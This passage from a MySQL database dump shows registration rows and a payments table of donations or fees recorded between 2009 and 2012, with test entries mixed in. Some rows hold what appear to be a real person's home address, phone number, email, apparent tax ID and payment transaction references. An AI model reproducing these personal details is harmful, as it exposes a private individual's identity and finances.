(42, 'Raj', 'Shekhar', '', '0000-00-00', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, '', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 2147483647, 'APPROVED', '9584703181321890', 'PAYMENT SUCESSFUL'),
(43, 'Raj', 'Shekhar', '', '0000-00-00', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, '', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 2147483647, 'ABORTED', '4451811241321890', 'IP Address is not of Payment Gateway, transaction declined.'),
(44, 'Raj', 'Shekhar', '', '0000-00-00', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, '', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 2147483647, 'APPROVED', '8812123271321890', 'PAYMENT SUCESSFUL'),
(45, 'Raj', 'Shekhar', '', '0000-00-00', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, '', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 2147483647, 'APPROVED', '4468307041521890', 'PAYMENT SUCESSFUL'),
(46, 'Raj', 'Shekhar', '', '0000-00-00', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, '', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 2147483647, 'INITIALISED', '', ''),
(47, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '10000 1234 Hyd AP 500040 India', 'Hyd', 'AP', 'India', 500040, 'Tech Specilaist', '9885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', '123456', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 2147483647, 'APPROVED', '6404259591521890', 'PAYMENT SUCESSFUL'),
(48, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '10000 1234 Hyd AP 500040 India', 'Hyd', 'AP', 'India', 500040, 'Tech Specilaist', '9885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', '123456', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 2147483647, 'APPROVED', '2622285071621890', 'PAYMENT SUCESSFUL'),
(49, '', '', '', '0000-00-00', 'M', '     India', '', '', 'India', 0, '', '', '', '', '', '', '', '', '', '', 0, 0, 'INITIALISED', '', ''),
(50, 'Test', 'a', 'vivek', '2000-11-16', 'M', 'wasef sdv dsv ad 400042 India', 'dsv', 'ad', 'India', 400042, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 10, 0, 'INITIALISED', '', ''),
(51, 'Test', 'a', 'vivek', '2000-11-16', 'M', 'wasef sdv dsv ad 400042 India', 'dsv', 'ad', 'India', 400042, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 100, 2147483647, 'INITIALISED', '', ''),
(52, 'Test', 'a', 'vivek', '2000-11-16', 'M', 'wasef sdv dsv ad 400042 India', 'dsv', 'ad', 'India', 400042, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 10, 2147483647, 'APPROVED', '9184864561421920', 'PAYMENT SUCESSFUL'),
(53, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd 400042 India', 'Ssad', 'asd', 'India', 400042, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 100, 2147483647, 'INITIALISED', '', ''),
(54, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd 400042 India', 'Ssad', 'asd', 'India', 400042, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 100, 2147483647, 'APPROVED', '7089032041521920', 'PAYMENT SUCESSFUL'),
(55, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd 400042 India', 'Ssad', 'asd', 'India', 400042, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 100, 2147483647, 'INITIALISED', '', ''),
(56, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd 400042 India', 'Ssad', 'asd', 'India', 400042, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 10, 2147483647, 'APPROVED', '3691282331621920', 'PAYMENT SUCESSFUL'),
(57, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '     India', '', '', 'India', 0, '', '', '', '', '', '', '', 'Raj Shekhar', '', '1', 1000, 2147483647, 'APPROVED', '2642312071621930', 'PAYMENT SUCESSFUL'),
(58, 'hjgyug', 'igiug', 'iugiuguigiu', '1989-07-01', 'M', 'jgfyuj fuy     India', '', '', 'India', 0, '', '', 'test@test.com', 'test@test.com', '', '', '', 'hjgyug igiug', '', '', 9, 2147483647, 'INITIALISED', '', ''),
(59, 'hjgyug', 'igiug', 'iugiuguigiu', '1989-07-01', 'M', 'jgfyuj fuy     India', '', '', 'India', 0, '', '', 'test@test.com', 'test@test.com', '', '', '', 'hjgyug igiug', '', '', 9, 2147483647, 'INITIALISED', '', ''),
(60, 'hjgyug', 'igiug', 'iugiuguigiu', '1989-07-01', 'M', 'jgfyuj fuy     India', '', '', 'India', 0, '', '', 'test@test.com', 'test@test.com', '', '', '', 'hjgyug igiug', '', '', 99, 2147483647, 'INITIALISED', '', ''),
(61, 'hjgyug', 'igiug', 'iugiuguigiu', '1989-07-01', 'M', 'jgfyuj fuy     India', '', '', 'India', 0, '', '', 'test@test.com', 'test@test.com', '', '', '', 'hjgyug igiug', '', '', 99, 2147483647, 'APPROVED', '4255637521621930', 'PAYMENT SUCESSFUL'),
(62, 'test', '', 'test', '1982-12-12', 'M', 'hyd     India', '', '', 'India', 0, '', '', 'test@test.com', 'test@test.com', '', '', '', 'test', '', '', 0, 0, 'INITIALISED', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `payments`
--

CREATE TABLE IF NOT EXISTS `payments` (
  `payment_id` int(5) NOT NULL AUTO_INCREMENT,
  `payment_date` date DEFAULT NULL,
  `mode_of_payment` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `instrument_no` varchar(10) COLLATE utf8_bin DEFAULT NULL,
  `instrument_date` date DEFAULT NULL,
  `instrument_amount` decimal(22,0) DEFAULT NULL,
  `instrument_narration` varchar(200) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`payment_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Payments' AUTO_INCREMENT=330 ;

--
-- Dumping data for table `payments`
--

INSERT INTO `payments` (`payment_id`, `payment_date`, `mode_of_payment`, `instrument_no`, `instrument_date`, `instrument_amount`, `instrument_narration`) VALUES
(91, '2011-05-03', 'Online Transfer', NULL, NULL, '1000', NULL),
(90, '2011-05-02', 'Online Transfer', NULL, NULL, '2000', NULL),
(89, '2011-04-29', 'Online Transfer', NULL, NULL, '20000', NULL),
(88, '2011-04-29', 'Online Transfer', NULL, NULL, '1500', NULL),
(87, '2011-04-15', 'Bank Deposit', NULL, NULL, '3000', NULL),
(86, '2011-04-11', 'Online Transfer', NULL, NULL, '10000', NULL),
(85, '2011-04-07', 'Online Transfer', NULL, NULL, '3000', NULL),
(84, '2011-03-31', 'Online Transfer', NULL, NULL, '1000', NULL),
(83, '2011-03-13', 'Cheque', '579883', NULL, '5000', NULL),
(82, '2011-03-10', 'Online Transfer', NULL, NULL, '2000', NULL),
(81, '2011-03-07', 'Online Transfer', NULL, NULL, '3000', NULL),
(80, '2011-03-03', 'Online Transfer', NULL, NULL, '1000', NULL),
(79, '2011-03-02', 'Online Transfer', NULL, NULL, '5000', NULL),
(78, '2011-03-01', 'Online Transfer', NULL, NULL, '1000', NULL),
(77, '2011-02-14', 'Online Transfer', NULL, NULL, '5000', NULL),
(76, '2011-02-07', 'Online Transfer', NULL, NULL, '3000', NULL),
(75, '2011-02-03', 'Online Transfer', NULL, NULL, '1000', NULL),
(74, '2011-02-02', 'Online Transfer', NULL, NULL, '6000', NULL),
(73, '2011-01-31', 'Online Transfer', NULL, NULL, '1000', NULL),
(72, '2011-01-12', 'Online Transfer', NULL, NULL, '5000', NULL),
(71, '2011-01-07', 'Online Transfer', NULL, NULL, '3000', NULL),
(70, '2011-01-04', 'Online Transfer', NULL, NULL, '13000', NULL),
(69, '2011-01-03', 'Online Transfer', NULL, NULL, '1000', NULL),
(68, '2011-01-03', 'Online Transfer', NULL, NULL, '1000', NULL),
(67, '2010-12-28', 'Online Transfer', NULL, NULL, '1000', NULL),
(66, '2010-12-14', 'Online Transfer', NULL, NULL, '1008', NULL),
(65, '2010-12-13', 'Cheque', '311731', NULL, '10000', NULL),
(64, '2010-12-07', 'Online Transfer', NULL, NULL, '3000', NULL),
(63, '2010-12-03', 'Online Transfer', NULL, NULL, '1000', NULL),
(62, '2010-12-01', 'Online Transfer', NULL, NULL, '5000', NULL),
(59, '2010-11-08', 'Online Transfer', NULL, NULL, '3000', NULL),
(60, '2010-11-22', 'Online Transfer', NULL, NULL, '10000', NULL),
(58, '2010-11-06', 'Online Transfer', NULL, NULL, '5000', NULL),
(57, '2010-11-03', 'Online Transfer', NULL, NULL, '1000', NULL),
(56, '2010-11-02', 'Online Transfer', NULL, NULL, '1000', NULL),
(55, '2010-10-30', 'Online Transfer', NULL, NULL, '100000', NULL),
(54, '2010-10-12', 'Cheque', '408198', '2010-07-30', '500', NULL),
(53, '2010-10-12', 'Cheque', '3004426', '2011-10-05', '1000', NULL),
(52, '2010-10-11', 'Online Transfer', NULL, NULL, '1000', NULL),
(51, '2010-10-07', 'Online Transfer', NULL, NULL, '5000', NULL),
(50, '2010-10-07', 'Online Transfer', NULL, NULL, '3000', NULL),
(49, '2010-10-04', 'Online Transfer', NULL, NULL, '1000', NULL),
(48, '2010-09-29', 'Online Transfer', NULL, NULL, '20000', NULL),
(47, '2010-09-09', 'Online Transfer', NULL, NULL, '5000', NULL),
(46, '2010-09-09', 'Online Transfer', NULL, NULL, '5000', NULL),
(45, '2010-09-07', 'Online Transfer', NULL, NULL, '3000', NULL),
(44, '2010-09-06', 'Online Transfer', NULL, NULL, '1000', NULL),
(43, '2010-09-03', 'Online Transfer', NULL, NULL, '1000', NULL),
(42, '2010-08-26', 'Bank Deposit', NULL, NULL, '10000', NULL),
(41, '2010-08-10', 'Online Transfer', NULL, NULL, '3500', NULL),
(40, '2010-08-09', 'Online Transfer', NULL, NULL, '1000', NULL),
(39, '2010-08-07', 'Online Transfer', NULL, NULL, '3000', NULL),
(38, '2010-08-05', 'Online Transfer', NULL, NULL, '5000', NULL),
(37, '2010-08-03', 'Online Transfer', NULL, NULL, '1000', NULL),
(36, '2010-07-09', 'Cheque', '876688', NULL, '1000', NULL),
(35, '2010-07-07', 'Online Transfer', NULL, NULL, '3000', NULL),
(34, '2010-07-06', 'Online Transfer', NULL, NULL, '1500', NULL),
(32, '2010-07-05', 'Online Transfer', NULL, NULL, '1000', NULL),
(33, '2010-07-06', 'Online Transfer', NULL, NULL, '5000', NULL),
(31, '2010-06-23', 'Bank Deposit', NULL, NULL, '500', NULL),
(30, '2010-06-19', 'Bank Deposit', NULL, NULL, '500', NULL),
(29, '2010-06-07', 'Online Transfer', NULL, NULL, '5000', NULL),
(28, '2010-06-01', 'Online Transfer', NULL, NULL, '3249', NULL),
(27, '2010-05-19', 'Online Transfer', NULL, NULL, '3200', NULL),
(26, '2010-05-19', 'Online Transfer', NULL, NULL, '3010', NULL),
(25, '2010-05-17', 'Online Transfer', NULL, NULL, '5000', NULL),
(24, '2010-05-12', 'Cheque', '318931', '2010-05-12', '5000', NULL),
(23, '2010-04-22', 'Cheque', NULL, NULL, '5000', NULL),
(22, '2010-04-12', 'Cheque', '975719', NULL, '5205', 'HDFC Bank'),
(21, '2010-04-09', 'Cheque', '926573', NULL, '40000', 'Karur Vysya Bank'),
(20, '2010-03-19', 'Online Transfer', NULL, NULL, '2299', NULL),
(18, '2010-02-04', 'Cheque', NULL, NULL, '10000', NULL),
(19, '2010-02-13', 'Bank Deposit', NULL, NULL, '4600', NULL),
(17, '2010-01-30', 'Online Transfer', NULL, NULL, '25000', NULL),
(16, '2010-01-30', 'Online Transfer', NULL, NULL, '5000', NULL),
(15, '2010-01-27', 'Cheque', NULL, NULL, '5000', 'Andhra Bank'),
(14, '2010-01-26', 'Bank Deposit', NULL, NULL, '4000', NULL),
(13, '2010-01-26', 'Bank Deposit', NULL, NULL, '2000', NULL),
(12, '2010-01-26', 'Cheque', '279467', '2010-01-26', '4001', 'HSBC'),
(11, '2010-01-26', 'Cheque', '411195', '2010-01-26', '5000', 'HDFC Bank'),
(9, '2009-12-20', 'Cheque', '253854', '2009-12-20', '7931', 'Canara Bank'),
(10, '2010-01-21', 'Online Transfer', NULL, NULL, '2547', NULL),
(8, '2009-12-08', 'Cheque', '235727', '2009-12-08', '5000', 'HDFC Bank'),
(4, '2009-08-28', 'Cheque', '462913', '2009-08-28', '5215', 'SBI'),
(5, '2009-09-12', 'Bank Deposit', NULL, NULL, '7500', NULL),
(6, '2009-09-14', 'Cheque', '160417', '2009-09-14', '5000', 'HDFC Bank'),
(7, '2009-11-26', 'Cheque', '505180', '2009-11-26', '10000', 'HSBC'),
(3, '2009-08-25', 'Cheque', '160415', '2009-08-25', '3155', 'HDFC Bank'),
(2, '2009-08-20', 'Cheque', '265191', '2009-08-20', '3200', 'HDFC Bank'),
(1, '2009-08-10', 'Cheque', '731250', '2009-08-10', '22375', 'ICICI Bank'),
(94, '2011-05-20', 'Online Transfer', NULL, NULL, '4011', NULL),
(61, '2010-11-30', 'Online Transfer', NULL, NULL, '1000', NULL),
(92, '2011-05-06', 'Online Transfer', NULL, NULL, '4000', NULL),
(93, '2011-05-07', 'Online Transfer', NULL, NULL, '3000', NULL),
(95, '2011-05-27', 'Cheque Deposit', NULL, NULL, '10000', NULL),
(96, '2011-05-31', 'Online Transfer', NULL, NULL, '1500', NULL),
(97, '2011-06-01', 'Online Transfer', NULL, NULL, '5000', NULL),
(98, '2011-06-02', 'Bank Deposit', NULL, NULL, '2000', NULL),
(99, '2011-06-02', 'Online Transfer', NULL, NULL, '1000', NULL),
(100, '2011-06-07', 'Online Transfer', NULL, NULL, '3000', NULL),
(101, '2011-06-10', 'Online Transfer', NULL, NULL, '3000', NULL),
(102, '2011-06-13', 'Bank Deposit', NULL, NULL, '1000', NULL),
(103, '2011-06-14', 'Online Transfer', NULL, NULL, '3000', NULL),
(104, '2011-06-17', 'Cheque', '521096', NULL, '5000', NULL),
(105, '2011-06-22', 'Online Transfer', NULL, NULL, '1008', NULL),
(106, '2011-06-28', 'Cheque', '261995', NULL, '12000', NULL),
(107, '2011-06-30', 'Online Transfer', NULL, NULL, '1500', NULL),
(108, '2011-07-02', 'Cheque', '218489', NULL, '2000', NULL),
(109, '2011-07-04', 'Online Transfer', NULL, NULL, '1000', NULL),
(110, '2011-07-14', 'Online', NULL, NULL, '5000', NULL),
(111, '2011-07-21', 'Online', NULL, NULL, '1008', NULL),
(112, '2011-07-26', 'Online', NULL, NULL, '3000', NULL),
(113, '2011-07-29', 'Online', NULL, NULL, '1500', NULL),
(114, '2011-08-02', 'Online', NULL, NULL, '1000', NULL),
(115, '2011-08-02', 'Online', NULL, NULL, '5000', NULL),
(116, '2011-08-22', 'Online Transfer', NULL, NULL, '3000', NULL),
(117, '2011-08-22', 'Online Transfer', NULL, NULL, '1008', NULL),
(118, '2011-08-30', 'Online Transfer', NULL, NULL, '1500', NULL),
(119, '2011-09-01', 'Online Transfer', NULL, NULL, '5000', NULL),
(120, '2011-09-02', 'Online Transfer', NULL, NULL, '1000', NULL),
(121, '2011-09-10', 'Online Transfer', NULL, NULL, '10000', NULL),
(122, '2011-09-12', 'Online Transfer', NULL, '0000-00-00', '10000', NULL),
(123, '2011-09-16', 'Cheque', '008822', NULL, '4000', NULL),
(124, '2010-12-25', 'Cash', NULL, NULL, '2894', NULL),
(125, '2010-12-25', 'Cash', NULL, NULL, '208', NULL),
(126, '2010-12-25', 'Cash', NULL, NULL, '148', NULL),
(127, '2011-09-21', 'Online Transfer', NULL, NULL, '1008', NULL),
(128, '2011-10-03', 'Online Transfer', NULL, NULL, '5000', NULL),
(129, '2011-09-29', 'Online Transfer', NULL, NULL, '1500', NULL),
(130, '2011-10-03', 'Online Transfer', NULL, NULL, '1000', NULL),
(131, '2011-10-11', 'Cheque', NULL, NULL, '4500', NULL),
(132, '2011-10-14', 'Cash', NULL, NULL, '10985', NULL),
(133, '2011-10-14', 'Cash', NULL, NULL, '8552', NULL),
(134, '2011-10-14', 'Cash', NULL, NULL, '2028', NULL),
(135, '2011-10-14', 'Cash', NULL, NULL, '406', NULL),
(136, '2011-10-14', 'Cash', NULL, NULL, '569', NULL),
(137, '2011-10-14', 'Cash', NULL, NULL, '3080', NULL),
(138, '2011-10-14', 'Cash', NULL, NULL, '1518', NULL),
(139, '2011-10-14', 'Cash', NULL, NULL, '7666', NULL),
(140, '2011-10-14', 'Cash', NULL, NULL, '470', NULL),
(141, '2011-10-14', 'Cash', NULL, NULL, '219', NULL),
(142, '2011-10-21', 'Online Transfer', NULL, NULL, '1008', NULL),
(143, '2011-10-21', 'Online Transfer', NULL, NULL, '8000', NULL),
(144, '2011-10-25', 'Online Transfer', NULL, NULL, '1000', NULL),
(145, '2011-10-31', 'Online Transfer', NULL, NULL, '1500', NULL),
(146, '2011-11-01', 'Online Transfer', NULL, NULL, '5000', NULL),
(147, '2011-11-01', 'Online Transfer', NULL, NULL, '5000', NULL),
(148, '2011-11-01', 'Online Transfer', NULL, NULL, '1000', NULL),
(149, '2011-11-21', 'Online Transfer', NULL, NULL, '3000', NULL),
(150, '2011-11-21', 'Online Transfer', NULL, NULL, '1008', NULL),
(151, '2011-11-30', 'Online Transfer', NULL, NULL, '1500', NULL),
(152, '2011-12-01', 'Online Transfer', NULL, NULL, '5000', NULL),
(153, '2011-12-02', 'Online Transfer', NULL, NULL, '1000', NULL),
(154, '2011-12-03', 'Online Transfer', NULL, NULL, '5302', NULL),
(155, '2011-12-03', 'Online Transfer', NULL, NULL, '4470', NULL),
(156, '2011-12-03', 'Online Transfer', NULL, NULL, '5943', NULL),
(157, '2011-12-03', 'Online Transfer', NULL, NULL, '4190', NULL),
(158, '2011-12-03', 'Online Transfer', NULL, NULL, '3390', NULL),
(159, '2011-12-03', 'Online Transfer', NULL, NULL, '900', NULL),
(160, '2011-12-15', 'Cheque', NULL, NULL, '30200', NULL),
(161, '2011-12-17', 'Online Transfer', NULL, NULL, '3000', NULL),
(162, '2011-12-21', 'Online Transfer', NULL, NULL, '1008', NULL),
(163, '2011-12-21', 'Online Transfer', NULL, NULL, '5000', NULL),
(164, '2011-12-28', 'Cheque', '513552', '2011-12-28', '54000', 'allocated to Bhubaneswar project and three phases of Indore project'),
(165, '2011-12-28', 'Cash', NULL, NULL, '3789', NULL),
(166, '2011-11-14', 'Cheque', '000003', '2011-11-14', '3000', 'DCB cheque'),
(167, '2011-12-30', 'Online Transfer', NULL, NULL, '1500', NULL),
(168, '2012-01-02', 'Online Transfer', NULL, NULL, '1000', NULL),
(169, '2012-01-02', 'Online Transfer', NULL, NULL, '5000', NULL),
(170, '2012-01-02', 'Online Transfer', NULL, NULL, '5000', NULL),
(171, '2012-01-05', 'Online', NULL, NULL, '5000', NULL),
(172, '2012-01-17', 'Online', NULL, NULL, '3000', NULL),
(173, '2012-01-18', 'Online', NULL, NULL, '2000', NULL),
(174, '2012-01-19', 'Bank Deposit', NULL, NULL, '4000', NULL),
(175, '2011-10-13', 'Cheque', '454769', NULL, '5000', NULL),
(176, '2012-01-21', 'Online', NULL, NULL, '1008', NULL),
(177, '2012-02-01', 'Online', NULL, NULL, '5000', NULL),
(178, '2012-02-01', 'Online', NULL, NULL, '5000', NULL),
(179, '2012-02-02', 'Online', NULL, NULL, '1000', NULL),
(180, '2012-01-29', 'Cash', NULL, NULL, '5107', NULL),
(181, '2012-02-07', 'Cash', NULL, NULL, '3823', NULL),
(182, '2012-02-01', 'Cash', NULL, NULL, '1264', NULL),
(183, '2012-01-29', 'Cash', NULL, NULL, '700', NULL),
(184, '2012-02-11', 'Online', NULL, NULL, '5000', NULL),
(185, '2012-02-18', 'Cheque', '300428', '2012-02-18', '1500', 'Citi Bank'),
(186, '2012-02-18', 'Cheque', '046424', '2012-02-18', '100000', 'ICICI Bank'),
(187, '2012-02-25', 'Cheque', '165493', NULL, '5000', NULL),
(188, '2012-02-15', 'Online', NULL, NULL, '2000', NULL),
(189, '2012-02-17', 'Online', NULL, NULL, '3000', NULL),
(190, '2012-02-21', 'Online', NULL, NULL, '1008', NULL),
(191, '2012-02-27', 'Online', NULL, NULL, '2000', NULL),
(192, '2012-03-01', 'Online', '', NULL, '5000', NULL),
(193, '2012-03-02', 'Online', '', NULL, '1000', NULL),
(194, '2012-03-05', 'Online', NULL, NULL, '5000', NULL),
(195, '2012-03-06', 'Online', NULL, NULL, '2000', NULL),
(196, '2012-03-08', 'Online', NULL, NULL, '5000', NULL),
(197, '2012-01-20', 'Cheque', '052582', '2012-01-20', '10000', 'ICICI Bank'),
(198, '2012-03-17', 'Online', NULL, NULL, '3000', NULL),
(199, '2012-03-21', 'Online', NULL, NULL, '1008', NULL),
(200, '2012-03-31', 'Online', NULL, NULL, '5000', NULL),
(201, '2012-03-07', 'Cash', NULL, NULL, '3059', NULL),
(202, '2012-04-03', 'Cash', NULL, NULL, '2005', NULL),
(203, '2012-02-25', 'Cash', NULL, NULL, '1020', NULL),
(204, '2012-03-26', 'Cash', NULL, NULL, '4381', NULL),
(205, '2012-02-26', 'Cash', NULL, NULL, '1019', NULL),
(206, '2012-03-25', 'Cash', NULL, NULL, '982', NULL),
(207, '2012-03-12', 'Cash', NULL, NULL, '2320', NULL),
(208, '2012-02-26', 'Cash', NULL, NULL, '1019', NULL),
(209, '2012-03-25', 'Cash', NULL, NULL, '399', NULL),
(210, '2012-03-25', 'Cash', NULL, NULL, '280', NULL),
(211, '2012-02-25', 'Cash', NULL, NULL, '1178', NULL),
(212, '2011-12-23', 'Cash', NULL, NULL, '320', NULL),
(213, '2012-02-04', 'Cash', NULL, NULL, '110', NULL),
(214, '2012-04-03', 'Online', NULL, NULL, '1000', NULL),
(215, '2012-04-03', 'Online', NULL, NULL, '5000', NULL),
(216, '2012-04-03', 'Online', NULL, NULL, '5000', NULL),
(217, '2012-04-10', 'Online', NULL, NULL, '3000', NULL),
(218, '2012-04-11', 'Online', NULL, NULL, '1000', NULL),
(219, '2012-04-12', 'Online', NULL, NULL, '2000', NULL),
(220, '2012-04-17', 'Online', NULL, NULL, '3000', NULL),
(221, '2012-04-21', 'Online', NULL, NULL, '1008', NULL),
(222, '2012-04-21', 'Online', NULL, NULL, '20000', NULL),
(223, '2012-05-01', 'Online', '', '0000-00-00', '5000', ''),
(224, '2012-05-01', 'Online', '', '0000-00-00', '2000', ''),
(225, '2012-05-02', 'Online', '', '0000-00-00', '1000', ''),
(226, '2012-05-02', 'Online', '', '0000-00-00', '5000', ''),
(227, '2012-05-02', 'Online', '', '0000-00-00', '5000', ''),
(228, '2012-05-03', 'Cheque', '63631', '2012-05-03', '11000', 'Axis Bank'),
(229, '2012-05-11', 'Bank Deposit', NULL, NULL, '500', NULL),
(230, '2012-05-11', 'Bank Deposit', NULL, NULL, '500', NULL),
(231, '2012-05-08', 'Online', NULL, NULL, '6000', NULL),
(232, '2012-05-21', 'Online', '', '0000-00-00', '1008', ''),
(233, '2012-05-21', 'Online', '', '0000-00-00', '10000', ''),
(234, '2012-05-21', 'Online', '248426', '2012-05-21', '10000', 'Canara Bank'),
(235, '2012-05-25', 'Online', '1326', '2012-05-25', '500', 'Axis Bank'),
(236, '2012-05-28', 'Cheque', '', '0000-00-00', '200', ''),
(237, '2012-05-31', 'Online', '', '0000-00-00', '420', ''),
(238, '2012-05-31', 'Online', '', '0000-00-00', '150', ''),
(239, '2012-06-01', 'Online', '', '0000-00-00', '5000', ''),
(240, '2012-06-02', 'Online', '', '0000-00-00', '2000', ''),
(241, '2012-06-02', 'Online', '', '0000-00-00', '2000', ''),
(242, '2012-06-02', 'Online', '', '0000-00-00', '5000', ''),
(243, '2012-06-04', 'Online', '', '0000-00-00', '6000', ''),
(244, '2012-06-05', 'Online', '', '0000-00-00', '2000', ''),
(245, '2012-05-26', 'Cash', '', '0000-00-00', '1252', ''),
(246, '2012-04-25', 'Cash', '', '0000-00-00', '3300', ''),
(247, '2012-05-27', 'Cash', '', '0000-00-00', '7905', ''),
(248, '2012-05-27', 'Cash', '', '0000-00-00', '1274', ''),
(249, '2012-05-27', 'Cash', '', '0000-00-00', '1372', ''),
(250, '2012-05-02', 'Cash', '', '0000-00-00', '3658', ''),
(251, '2012-05-22', 'Cash', '', '0000-00-00', '2500', ''),
(252, '2012-05-22', 'Cash', '', '0000-00-00', '350', ''),
(253, '2012-06-09', 'Cash', '', '0000-00-00', '3979', ''),
(254, '2012-06-12', 'Cash', '', '0000-00-00', '1811', ''),
(255, '2012-06-07', 'Online', '', '0000-00-00', '1500', ''),
(256, '2012-06-11', 'Online', '', '0000-00-00', '3000', ''),
(257, '2012-06-13', 'Online', '', '0000-00-00', '1000', ''),
(258, '2012-06-14', 'Online', '', '0000-00-00', '1008', ''),
(259, '2012-06-21', 'Online', '', '0000-00-00', '1008', ''),
(260, '2012-06-24', 'Cash', '', '0000-00-00', '3066', ''),
(261, '2012-06-24', 'Cash', '', '0000-00-00', '627', ''),
(262, '2012-06-29', 'Online', '', '0000-00-00', '1500', ''),
(263, '2012-07-03', 'Online', '', '0000-00-00', '2000', ''),
(264, '2012-07-03', 'Online', '', '0000-00-00', '5000', ''),
(265, '2012-07-03', 'Online', '', '0000-00-00', '2000', ''),
(266, '2012-07-04', 'Online', '', '0000-00-00', '5000', ''),
(267, '2012-07-05', 'Online', '', '0000-00-00', '4220', ''),
(268, '2012-07-09', 'Online', '', '0000-00-00', '10000', ''),
(269, '2012-07-10', 'Online', '', '0000-00-00', '100000', ''),
(270, '2012-07-19', 'Online', '', '0000-00-00', '5000', ''),
(271, '2012-07-20', 'Online', '', '0000-00-00', '3000', ''),
(272, '2012-07-21', 'Online', '', '0000-00-00', '1008', ''),
(273, '2012-07-26', 'Cheque', '997658', '0000-00-00', '1000', ''),
(274, '2012-08-01', 'Online', '', '0000-00-00', '2000', ''),
(275, '2012-08-02', 'Online', '', '0000-00-00', '2000', ''),
(276, '2012-08-02', 'Online', '', '0000-00-00', '5000', ''),
(277, '2012-08-05', 'Online', '', '0000-00-00', '5000', ''),
(278, '2012-08-09', 'Online', '', '0000-00-00', '4500', ''),
(279, '2012-07-16', 'Cash Deposit', '', '0000-00-00', '3800', ''),
(280, '2012-07-16', 'Cash Deposit', '', '0000-00-00', '4050', ''),
(281, '2012-07-29', 'Cash Deposit', '', '0000-00-00', '4400', ''),
(282, '2012-07-29', 'Cash Deposit', '', '0000-00-00', '2550', ''),
(283, '2012-07-29', 'Cash Deposit', '', '0000-00-00', '1347', ''),
(284, '2012-08-15', 'Cheque', '240945', '0000-00-00', '1000', 'ICICI Bank'),
(285, '2012-08-17', 'Online', '', '0000-00-00', '425', ''),
(286, '2012-08-21', 'Online', '', '0000-00-00', '1008', ''),
(287, '2012-08-22', 'Online', '', '0000-00-00', '2500', ''),
(288, '2012-08-29', 'Online', '', '0000-00-00', '1000', ''),
(289, '2012-09-03', 'Online', '', '0000-00-00', '2000', ''),
(290, '2012-09-04', 'Online', '', '0000-00-00', '5000', ''),
(291, '2012-09-05', 'Online', '', '0000-00-00', '2500', ''),
(292, '2012-09-13', 'Online', '', '0000-00-00', '8500', ''),
(293, '2012-09-21', 'Online', '', '0000-00-00', '1008', ''),
(294, '2012-08-26', 'Cash Deposit', '', '0000-00-00', '2347', ''),
(295, '2012-08-26', 'Cash Deposit', '', '0000-00-00', '1085', ''),
(296, '2012-08-26', 'Cash Deposit', '', '0000-00-00', '2255', ''),
(297, '2012-09-20', 'Cash Deposit', '', '0000-00-00', '5070', ''),
(298, '2012-09-26', 'Online', '', '0000-00-00', '15000', ''),
(299, '2012-09-27', 'Online', '', '0000-00-00', '10000', ''),
(300, '2012-10-01', 'Online', '', '0000-00-00', '5000', ''),
(301, '2012-10-01', 'Cheque', '551743', '2012-10-01', '25000', 'Andhra Bank'),
(302, '2012-10-03', 'Online', '', '0000-00-00', '2000', ''),
(303, '2012-10-03', 'Online', '', '0000-00-00', '2500', ''),
(304, '2012-10-04', 'Online', '', '0000-00-00', '2030', ''),
(305, '2012-10-06', 'Online', '15', '2012-10-06', '3000', 'DCB Bank'),
(306, '2012-09-30', 'Cash Deposit', '', '0000-00-00', '3975', ''),
(307, '2012-09-30', 'Cash Deposit', '', '0000-00-00', '1391', ''),
(308, '2012-09-30', 'Cash Deposit', '', '0000-00-00', '2377', ''),
(309, '2012-10-13', 'Online', NULL, NULL, '6000', NULL),
